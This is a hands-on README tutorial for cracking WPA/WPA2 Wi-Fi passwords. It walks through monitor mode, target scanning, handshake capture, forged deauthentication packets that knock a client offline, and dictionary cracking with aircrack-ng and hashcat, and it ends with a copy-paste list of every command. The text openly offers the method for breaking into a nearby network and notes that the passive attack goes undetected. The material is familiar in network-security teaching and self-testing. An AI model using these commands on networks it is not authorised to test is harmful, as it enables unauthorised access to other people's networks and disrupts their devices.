# Wi-Fi Cracking

Crack WPA/WPA2 Wi-Fi Routers with Airodump-ng and [Aircrack-ng](http://aircrack-ng.org/)/[Hashcat](http://hashcat.net/). 

This is a brief walk-through tutorial that illustrates how to crack Wi-Fi networks that are secured using weak passwords. It is not exhaustive, but it should be enough information for you to test your own network's security or break into one nearby. The attack outlined below is entirely passive (listening only, nothing is broadcast from your computer) and it is impossible to detect provided that you don't actually use the password that you crack. An optional active deauthentication attack can be used to speed up the reconnaissance process and is described at the [end of this document](#deauth-attack).

If you are familiar with this process, you can skip the descriptions and jump to a list of the commands used at [the bottom](#list-of-commands). For a variety of suggestions and alternative methods, see the [appendix](appendix.md). [neal1991](https://github.com/neal1991) and [tiiime](https://github.com/tiiime) have also graciously provided translations to [this document](README.zh.md) and the [appendix](appendix.zh.md) in Chinese if you prefer those versions.

__DISCLAIMER: This software/tutorial is for educational purposes only. It should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.__

## Getting Started

This tutorial assumes that you:

- Have a general comfortability using the command-line
- Are running a debian-based linux distro, preferably [Kali linux](https://www.kali.org/) (OSX users see the [appendix](appendix.md))
- Have [Aircrack-ng](http://aircrack-ng.org/) installed
	- `sudo apt-get install aircrack-ng`
- Have a wireless card that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) (see [here](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html) for a list of supported devices)

## Cracking a Wi-Fi Network

### Monitor Mode

Begin by listing wireless interfaces that support monitor mode with:

```bash
airmon-ng
```

If you do not see an interface listed then your wireless card does not support monitor mode 😞

We will assume your wireless interface name is `wlan0` but be sure to use the correct name if it differs from this. Next, we will place the interface into monitor mode:

```bash
airmon-ng start wlan0
```

Run `iwconfig`. You should now see a new monitor mode interface listed (likely `mon0` or `wlan0mon`).

### Find Your Target

Start listening to [802.11 Beacon frames](https://en.wikipedia.org/wiki/Beacon_frame) broadcast by nearby wireless routers using your monitor interface:

```bash
airodump-ng mon0
```

You should see output similar to what is below.

```
CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                         
                                                                                                                                              
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests                                                   
 14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8                                                          
 14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        <length:  0>                                                        
 14:22:DB:1A:DB:66  -83       48        0    0   1  54e. WPA2 CCMP   PSK  steveserro                                                          
 9C:5C:8E:C9:AB:C0  -81       19        0    0   3  54e  WPA2 CCMP   PSK  hackme                                                                 
 00:23:69:AD:AF:94  -82      350        4    0   1  54e  WPA2 CCMP   PSK  Kaitlin's Awesome                                                   
 06:26:BB:75:ED:69  -84      232        0    0   1  54e. WPA2 CCMP   PSK  HH2                                                                 
 78:71:9C:99:67:D0  -82      339        0    0   1  54e. WPA2 CCMP   PSK  ARRIS-67D2                                                          
 9C:34:26:9F:2E:E8  -85       40        0    0   1  54e. WPA2 CCMP   PSK  Comcast_2EEA-EXT                                                    
 BC:EE:7B:8F:48:28  -85      119       10    0   1  54e  WPA2 CCMP   PSK  root                                                                
 EC:1A:59:36:AD:CA  -86      210       28    0   1  54e  WPA2 CCMP   PSK  belkin.dca
```

For the purposes of this demo, we will choose to crack the password of my network, "hackme". Remember the BSSID MAC address and channel (`CH`) number as displayed by `airodump-ng`, as we will need them both for the next step.

### Capture a 4-way Handshake

WPA/WPA2 uses a [4-way handshake](https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk) to authenticate devices to the network. You don't have to know anything about what that means, but you do have to capture one of these handshakes in order to crack the network password. These handshakes occur whenever a device connects to the network, for instance, when your neighbor returns home from work. We capture this handshake by directing `airmon-ng` to monitor traffic on the target network using the channel and bssid values discovered from the previous command.

```bash
# replace -c and --bssid values with the values of your target network
# -w specifies the directory where we will save the packet capture
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
```
```
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
                                                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS  
```

Now we wait... Once you've captured a handshake, you should see something like `[ WPA handshake: bc:d3:c9:ef:d2:67` at the top right of the screen, just right of the current time. 

If you are feeling impatient, and are comfortable using an active attack, you can force devices connected to the target network to reconnect, be sending malicious deauthentication packets at them. This often results in the capture of a 4-way handshake. See the [deauth attack section](#deauth-attack) below for info on this. 

Once you've captured a handshake, press `ctrl-c` to quit `airodump-ng`. You should see a `.cap` file wherever you told `airodump-ng` to save the capture (likely called `-01.cap`). We will use this capture file to crack the network password. I like to rename this file to reflect the network name we are trying to crack:

```bash
mv ./-01.cap hackme.cap
```

### Crack the Network Password

The final step is to crack the password using the captured handshake. If you have access to a GPU, I **highly** recommend using `hashcat` for password cracking. I've created a simple tool that makes hashcat super easy to use called [`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat). If you don't have access to a GPU, there are various online GPU cracking services that you can use, like [GPUHASH.me](https://gpuhash.me/) or [OnlineHashCrack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php). You can also try your hand at CPU cracking with Aircrack-ng.

Note that both attack methods below assume a relatively weak user generated password. Most WPA/WPA2 routers come with strong 12 character random passwords that many users (rightly) leave unchanged. If you are attempting to crack one of these passwords, I recommend using the [Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length) dictionary files.

#### Cracking With `naive-hashcat` (recommended)

Before we can crack the password using naive-hashcat, we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by either uploading the `.cap` file to <https://hashcat.net/cap2hccapx/> or using the [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) tool directly.

```bash
cap2hccapx.bin hackme.cap hackme.hccapx
```

Next, download and run `naive-hashcat`:

```bash
# download
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# download the 134MB rockyou dictionary file
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack ! baby ! crack !
# 2500 is the hashcat hash mode for WPA/WPA2
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

Naive-hashcat uses various [dictionary](https://hashcat.net/wiki/doku.php?id=dictionary_attack), [rule](https://hashcat.net/wiki/doku.php?id=rule_based_attack), [combination](https://hashcat.net/wiki/doku.php?id=combinator_attack), and [mask](https://hashcat.net/wiki/doku.php?id=mask_attack) (smart brute-force) attacks and it can take days or even months to run against mid-strength passwords. The cracked password will be saved to hackme.pot, so check this file periodically. Once you've cracked the password, you should see something like this as the contents of your `POT_FILE`:

```
e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet
```

Where the last two fields separated by `:` are the network name and password respectively.

If you would like to use `hashcat` without `naive-hashcat` see [this page](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2) for info.

#### Cracking With Aircrack-ng

Aircrack-ng can be used for very basic dictionary attacks running on your CPU. Before you run the attack you need a wordlist. I recommend using the infamous rockyou dictionary file:

```bash
# download the 134MB rockyou dictionary file
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

Note, that if the network password is not in the wordfile you will not crack the password.

```bash
# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
```

If the password is cracked you will see a `KEY FOUND!` message in the terminal followed by the plain text version of the network password.

```
                                 Aircrack-ng 1.2 beta3


                   [00:01:49] 111040 keys tested (1017.96 k/s)


                         KEY FOUND! [ hacktheplanet ]


      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 
                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E 

      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 
                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 
                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 
                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 

      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 
```

## Deauth Attack

A deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack. These packets include fake "sender" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`. 

Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid MAC`) until you see a client (`STATION`) connected. A connected client look something like this, where is `64:BC:0C:48:97:F7` the client MAC.

```
 CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         
                                                                                                                                           
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         
                                                                                                                                           
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
```

Now, leave `airodump-ng` running and open a new terminal. We will use the `aireplay-ng` command to send fake deauth packets to our victim client, forcing it to reconnect to the network and hopefully grabbing a handshake in the process.

```bash
# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
```

You can optionally broadcast deauth packets to all connected clients with:

```bash
# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
``` 

Once you've sent the deauth packets, head back over to your `airodump-ng` process, and with any luck you should now see something like this at the top right: `[ WPA handshake: 9C:5C:8E:C9:AB:C0`. Now that you've captured a handshake you should be ready to [crack the network password](#cracking-the-network-password).

## List of Commands

Below is a list of all of the commands needed to crack a WPA/WPA2 network, in order, with minimal explanation.

```bash
# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## crack password with aircrack-ng... ##########

# download 134MB rockyou.txt dictionary file if needed
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## or crack password with naive-hashcat ##########

# convert cap to hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# crack with naive-hashcat
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

## Appendix

The response to this tutorial was so great that I've added suggestions and additional material from community members as an [appendix](appendix.md). Check it out to learn how to:

- Capture handshakes and crack WPA passwords on MacOS/OSX
- Capture handshakes from every network around you with `wlandump-ng`
- Use `crunch` to generate 100+GB wordlists on-the-fly
- Spoof your MAC address with `macchanger`

A [Chinese version](appendix.zh.md) of the appendix is also available.

## Attribution

Much of the information presented here was gleaned from [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html). Thanks also to the awesome authors and maintainers who work on Aircrack-ng and Hashcat. 

Overwhelming thanks to [neal1991](https://github.com/neal1991) and [tiiime](https://github.com/tiiime) for translating this tutorial into [Chinese](README.zh.md). Further shout outs to [yizhiheng](https://github.com/yizhiheng), [hiteshnayak305](https://github.com/hiteshnayak305), [enilfodne](https://github.com/enilfodne), [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore), [hivie7510](https://www.reddit.com/user/hivie7510), [cprogrammer1994](https://github.com/cprogrammer1994), [0XE4](https://github.com/0XE4), [hartzell](https://github.com/hartzell), [zeeshanu](https://github.com/zeeshanu), [flennic](https://github.com/flennic), [bhusang](https://github.com/bhusang), [tversteeg](https://github.com/tversteeg), [gpetrousov](https://github.com/gpetrousov), [crowchirp](https://github.com/crowchirp) and [Shark0der](https://github.com/shark0der) who also provided suggestions and typo fixes on [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) and GitHub. If you are interested in hearing some proposed alternatives to WPA2, check out some of the great discussion on [this](https://news.ycombinator.com/item?id=14840539) Hacker News post.
